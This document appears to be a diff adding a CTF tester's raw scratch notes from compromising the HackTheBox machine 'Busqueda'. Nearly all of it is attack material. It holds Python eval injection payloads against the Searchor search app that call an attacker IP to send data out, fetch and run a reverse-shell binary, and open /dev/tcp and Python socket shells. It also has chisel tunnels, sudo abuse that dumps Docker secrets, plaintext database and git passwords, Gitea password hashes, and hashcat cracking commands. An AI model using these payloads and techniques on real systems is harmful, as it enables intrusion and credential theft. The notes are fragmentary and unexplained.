@@ -1,0 +1,337 @@
+┌──(anhndt㉿Laptop14)-[~]
+└─$ nmap -sCV -Pn -p- 10.10.11.208 2>/dev/null
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 10:22 +07
+Nmap scan report for busqueda.htb (10.10.11.208)
+Host is up (0.067s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://searcher.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 138.82 seconds
+
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.searcher.htb" --hc 403,400,301 -t 10 10.10.11.208
+
+
+"__import__('subprocess').getoutput('curl 10.10.16.19:8000')"
+
+
+"__import__('time').getoutput('time.sleep(10)')"
+
+
+https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b
+
+
+engine, query
+
+f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
+
+f"Engine.{engine}.search('{query}',copy_url={copy},open_web={open});__import__('subprocess').getoutput('curl 10.10.16.19:8000')#"
+
+								 ',copy_url={copy},open_web={open});__import__('subprocess').getoutput('curl 10.10.16.19:8000')#
+								
+								 ')\n__import__('subprocess').getoutput('curl 10.10.16.19:8000') #
+								
+
+
+
+"__import__('subprocess').getoutput('echo 1')\t;__import__('subprocess').getoutput('echo 2')"
+
+
+eval("__import__('subprocess').getoutput('echo 1')")
+
+eval("__import__('subprocess').getoutput('echo 1')\n__import__('subprocess').getoutput('echo 2')")
+
+eval("__import__('subprocess').getoutput('echo 1')\n sum([5, 5, 5])")
+
+
+"4 / 3 * __import__('math').pi * __import__('math').pow(25, 3)"
+
+
+print(1);__import__('subprocess').getoutput('curl 127.0.0.1:8000')#
+
+
+compile("print(1);__import__('subprocess').getoutput('curl 10.10.16.24:8000')#", "<string>", "eval")
+
+
+Engine. new('nstest','nstest')"#
+
+eval(f"print(val)",{},{"val":100})
+
+
+__import__('subprocess').getoutput('curl 10.10.16.24:8000')
+
+
+f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
+
+f"Engine.{engine}.search('a')#
+
+
+exec('__import__('subprocess').getoutput('curl 10.10.16.24:8000')')
+
+eval(exec('__import__('subprocess').getoutput('curl 10.10.16.24:8000')'))
+
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl+10.10.16.24%3a8000'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl+10.10.16.24:8000/$(pwd)'))#
+/var/www/app
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('wget 10.10.16.24:8000/bashrevshell'))#
+10.10.11.208 - - [12/Apr/2023 14:08:51] "GET /bashrevshell HTTP/1.1" 200 -
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('chmod 777 bashrevshell'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('./bashrevshell'))#
+
+
+
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl+10.10.16.24:8000/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'))#
+
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('sh -i >& /dev/tcp/10.10.16.24/7050 0>&1'))#
+
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl 10.10.16.24:8000/bashrevshell -o /tmp/bashrevshell'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl 10.10.16.24:8000/$(ls /tmp |base64)'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('chmod 777 /tmp/bashrevshell'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('/tmp/bashrevshell'))#
+
+
+
+eval("exec(\"import os,pty,socket;s=socket.socket();s.connect((\"10.10.16.24\",7050));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\")")
+
+eval("exec('import os,pty,socket;s=socket.socket();s.connect(('10.10.16.24',7050));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('sh')')")
+import os,pty,socket;s=socket.socket();s.connect(('10.10.16.24',7050));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('sh')
+
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl 10.10.16.24:8000/$(ls /home/svc |base64)'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl 10.10.16.24:8000/$(ls /tmp |base64)'))#
+
+
+
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl 10.10.16.24:8000/nsrevshell.py -o /home/svc/nsrevshell.py'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('curl 10.10.16.24:8000/$(ls /home/svc/ |base64)'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('chmod 777 /home/svc/nsrevshell.py'))#
+
+engine=Accuweather&query=a',__import__('subprocess').getoutput('[python3 /home/svc/nsrevshell.py'))#
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+
+bash-5.1$ cat config
+cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+
+
+ssh svc@10.10.11.208 
+jh1usoih2bkjaspwe92
+
+
+53,600.4
+
+59,556\157,500
+
+157,500
+
+
+
+
+
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 12 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 12 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+
+
+
+./chisel64 server -p 60000 --reverse
+
+./chisel64 client 10.10.16.24:60000 R:60001:127.0.0.1:3000
+
+
+./chisel64 server -p 8000 --reverse
+
+./chisel64 client 10.10.16.24:8000 R:3000:127.0.0.1:3000
+
+
+svc@busqueda:~$ sudo -l
+[sudo] password for svc: 
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+
+svc@busqueda:/opt$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Mounts}}' mysql_db
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db
+
+
+{"Id":"f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8","Created":"2023-01-06T17:26:45.724856768Z","Path":"docker-entrypoint.sh","Args":["mysqld"],"State":{"Status":"running","Running":true,"Paused":false,"Restarting":false,"OOMKilled":false,"Dead":false,"Pid":1814,"ExitCode":0,"Error":"","StartedAt":"2023-04-13T08:08:19.437503223Z","FinishedAt":"2023-04-04T17:03:02.25154071Z"},"Image":"sha256:7484689f290f1defe06b65befc54cb6ad91a667cf0af59a265ffe76c46bd0478","ResolvConfPath":"/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/resolv.conf","HostnamePath":"/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/hostname","HostsPath":"/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/hosts","LogPath":"/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8-json.log","Name":"/mysql_db","RestartCount":0,"Driver":"overlay2","Platform":"linux","MountLabel":"","ProcessLabel":"","AppArmorProfile":"docker-default","ExecIDs":null,"HostConfig":{"Binds":["/root/scripts/docker/mysql:/var/lib/mysql:rw"],"ContainerIDFile":"","LogConfig":{"Type":"json-file","Config":{}},"NetworkMode":"docker_gitea","PortBindings":{"3306/tcp":[{"HostIp":"127.0.0.1","HostPort":"3306"}]},"RestartPolicy":{"Name":"always","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":[],"CapAdd":null,"CapDrop":null,"CgroupnsMode":"private","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"private","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":67108864,"Runtime":"runc","ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":null,"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":null,"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"OomKillDisable":null,"PidsLimit":null,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]},"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0-init/diff:/var/lib/docker/overlay2/a4da5d7e3df4c4cf7f6b2fe7df9d796b09e4b9d5b8430afb9bda10312385acd1/diff:/var/lib/docker/overlay2/73a0df4fac76e17181389bf89f324eb674d40ad26fc0cf5d4570c0fe2dbb52c0/diff:/var/lib/docker/overlay2/1705a1d523a56b654d350ccd41961cd541f8d22fade1e497c441ced2fd93e39a/diff:/var/lib/docker/overlay2/e4441c5b0550897758a6122664b3024905bc374ce89071f62ce957e8e802922d/diff:/var/lib/docker/overlay2/ef058a407a2a6c54acb02f9b015081d72e576ad284a14ab22d1e455a1c8e030f/diff:/var/lib/docker/overlay2/2e330bfa21f2c72223a60d2e90e9b856116d086e42607494166556b31c5cd40d/diff:/var/lib/docker/overlay2/f90d2dd1fd62543f813e0c01ddb5c8d9b5a0f85e5a638a3cbdc7d54da3c06184/diff:/var/lib/docker/overlay2/df21f9ce55eb6858cb6c78ae8da6574dde9ec267342c5d2076a58db14a6d27aa/diff:/var/lib/docker/overlay2/c772565ab63c4c69c5a74fc583a926e468fda9231836f22e70f93097829f481d/diff:/var/lib/docker/overlay2/70d25e07bcfdd16b9b867063259ab16d8bcf3940cc21516262f6feaa67fdb71d/diff:/var/lib/docker/overlay2/c030c975c92c921fa203634104a1bde311b1227e4c5be595fbb5a0a2c5de3ad5/diff","MergedDir":"/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0/merged","UpperDir":"/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0/diff","WorkDir":"/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0/work"},"Name":"overlay2"},"Mounts":[{"Type":"bind","Source":"/root/scripts/docker/mysql","Destination":"/var/lib/mysql","Mode":"rw","RW":true,"Propagation":"rprivate"}],"Config":{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}},"NetworkSettings":{"Bridge":"","SandboxID":"e3907f29ab63270531a4f95baf8666534e942b8dec5b931704f585e0fb5ca473","HairpinMode":false,"LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"Ports":{"3306/tcp":[{"HostIp":"127.0.0.1","HostPort":"3306"}],"33060/tcp":null},"SandboxKey":"/var/run/docker/netns/e3907f29ab63","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null,"EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","MacAddress":"","Networks":{"docker_gitea":{"IPAMConfig":null,"Links":null,"Aliases":["f84a6b33fb5a","db"],"NetworkID":"cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227","EndpointID":"661812e8c77f6d4e13e93a9fffcad4e5c02fb5bc71325777c73607f70344eff5","Gateway":"172.19.0.1","IPAddress":"172.19.0.3","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:13:00:03","DriverOpts":null}}}}
+
+
+0	:	MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
+1	:	MYSQL_USER=gitea
+2	:	MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
+3	:	MYSQL_DATABASE=gitea
+4	:	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+5	:	GOSU_VERSION=1.14
+6	:	MYSQL_MAJOR=8.0
+7	:	MYSQL_VERSION=8.0.31-1.el8
+8	:	MYSQL_SHELL_VERSION=8.0.31-1.el8
+
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
+
+
+{"Id":"960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb","Created":"2023-01-06T17:26:54.457090149Z","Path":"/usr/bin/entrypoint","Args":["/bin/s6-svscan","/etc/s6"],"State":{"Status":"running","Running":true,"Paused":false,"Restarting":false,"OOMKilled":false,"Dead":false,"Pid":1838,"ExitCode":0,"Error":"","StartedAt":"2023-04-13T08:08:19.910688744Z","FinishedAt":"2023-04-04T17:03:01.71746837Z"},"Image":"sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78","ResolvConfPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf","HostnamePath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname","HostsPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts","LogPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log","Name":"/gitea","RestartCount":0,"Driver":"overlay2","Platform":"linux","MountLabel":"","ProcessLabel":"","AppArmorProfile":"docker-default","ExecIDs":null,"HostConfig":{"Binds":["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro","/root/scripts/docker/gitea:/data:rw"],"ContainerIDFile":"","LogConfig":{"Type":"json-file","Config":{}},"NetworkMode":"docker_gitea","PortBindings":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"RestartPolicy":{"Name":"always","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":[],"CapAdd":null,"CapDrop":null,"CgroupnsMode":"private","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"private","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":67108864,"Runtime":"runc","ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":null,"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":null,"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"OomKillDisable":null,"PidsLimit":null,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]},"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff","MergedDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged","UpperDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff","WorkDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"},"Name":"overlay2"},"Mounts":[{"Type":"bind","Source":"/etc/timezone","Destination":"/etc/timezone","Mode":"ro","RW":false,"Propagation":"rprivate"},{"Type":"bind","Source":"/root/scripts/docker/gitea","Destination":"/data","Mode":"rw","RW":true,"Propagation":"rprivate"},{"Type":"bind","Source":"/etc/localtime","Destination":"/etc/localtime","Mode":"ro","RW":false,"Propagation":"rprivate"}],"Config":{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}},"NetworkSettings":{"Bridge":"","SandboxID":"c3e6a1558bec28607b439a097d26967543055a11e1e1805590fe288359f337f3","HairpinMode":false,"LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"Ports":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"SandboxKey":"/var/run/docker/netns/c3e6a1558bec","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null,"EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","MacAddress":"","Networks":{"docker_gitea":{"IPAMConfig":null,"Links":null,"Aliases":["server","960873171e2e"],"NetworkID":"cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227","EndpointID":"c5feb1c45d3560a1b5ca40bee06d3748c3fcc3b55ba5a824f608552427010349","Gateway":"172.19.0.1","IPAddress":"172.19.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:13:00:02","DriverOpts":null}}}}
+
+
+0	:	USER_UID=115
+1	:	USER_GID=121
+2	:	GITEA__database__DB_TYPE=mysql
+3	:	GITEA__database__HOST=db:3306
+4	:	GITEA__database__NAME=gitea
+5	:	GITEA__database__USER=gitea
+6	:	GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
+7	:	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+8	:	USER=git
+9	:	GITEA_CUSTOM=/data/gitea
+
+
+mysql 172.19.0.3
+
+gittea 172.19.0.2
+
+
+mysql -u root -p -h 172.19.0.3 -P 3306
+jI86kGUuj87guWr3RyF
+
+
++----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
+| id | lower_name    | name          | full_name | email                            | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands                            | salt                             | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar | avatar_email                     | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme | keep_activity_private |
++----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
+|  1 | administrator | administrator |           | administrator@gitea.searcher.htb |                  0 | enabled                        | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 44748ed806accc9d96bf9f495979b742 | a378d3f64143b284f104c926b8b49dfb | en-US    |             |   1672857920 |   1680531979 |      1673083022 |                    1 |                -1 |         1 |        1 |             0 |              0 |                  0 |                         1 |              0 |        | administrator@gitea.searcher.htb |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
+|  2 | cody          | cody          |           | cody@gitea.searcher.htb          |                  0 | enabled                        | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 304b5a2ce88b6d989ea5fae74cc6b3f3 | d1db0a75a18e50de754be2aafcad5533 | en-US    |             |   1672858006 |   1680532283 |      1680532243 |                    1 |                -1 |         1 |        0 |             0 |              0 |                  0 |                         1 |              0 |        | cody@gitea.searcher.htb          |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
++----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
+
+
+ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+
+a378d3f64143b284f104c926b8b49dfb
+
+"sha256", ":", iterations, ":", base64 salt, ":", base64 digest
+
+11900	PBKDF2-HMAC-MD5		md5:1000:MTg1MzA=:Lz84VOcrXd699Edsj34PP98+f4f3S0rTZ4kHAIHoAjs=
+12000	PBKDF2-HMAC-SHA1	sha1:1000:MzU4NTA4MzIzNzA1MDQ=:19ofiY+ahBXhvkDsp0j2ww==
+12100	PBKDF2-HMAC-SHA512	sha512:1000:ODQyMDEwNjQyODY=:MKaHNWXUsuJB3IEwBHbm3w==
+
+
+sha1:1000:a378d3f64143b284f104c926b8b49dfb:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+
+
+hashcat -m 12000 -a 0 -w 3 sha1:1000:a378d3f64143b284f104c926b8b49dfb:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 /home/anhndt/Stuffs/rockyou.txt
+
+
+hashcat -m 12100 -a 0 -w 3 sha512:1000:a378d3f64143b284f104c926b8b49dfb:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 /home/anhndt/Stuffs/rockyou.txt
+
